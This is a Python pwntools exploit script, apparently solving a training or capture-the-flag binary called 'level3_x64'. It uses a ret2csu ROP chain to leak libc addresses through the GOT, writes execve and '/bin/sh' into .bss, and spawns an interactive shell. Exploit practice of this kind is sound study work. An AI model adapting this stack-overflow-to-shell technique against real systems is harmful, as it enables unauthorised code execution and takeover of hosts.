from pwn import *


level5 = ELF('./level3_x64')
sh = process('./level3_x64')

write_got = level5.got['write']
print(hex(write_got))
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
print(hex(bss_base))
csu_front_addr = 0x0000000000400690
csu_end_addr = 0x00000000004006AA
fakeebp = b'b' * 8


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = b'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38
    payload += p64(last)
    sh.send(payload)


sh.recvuntil(b'Input:\n')
## RDI, RSI, RDX, RCX, R8, R9, more on the stack
## write(1,write_got,8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
print(hex(write_addr))

sh.recvuntil(b'Input:\n')
csu(0 ,1 ,write_got, 8, read_got, 1, main_addr)

read_addr = u64(sh.recv(8))
print(hex(read_addr))
execve_offset = 0x00eb0f0 
libc_base = write_addr - 0x114a20
execve_addr = libc_base + execve_offset
str_offset = 0x1d8698
str_addr = str_offset + libc_base
sh.recvuntil(b'Input:\n')
#csu(0, 1, write_got, 8, str_addr, 1, main_addr)
#print(sh.recv())
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + b'/bin/sh\x00')
sh.recvuntil(b'Input:\n')
csu(0, 1, bss_base, 0, 0, bss_base + 8 , main_addr)
sh.interactive()
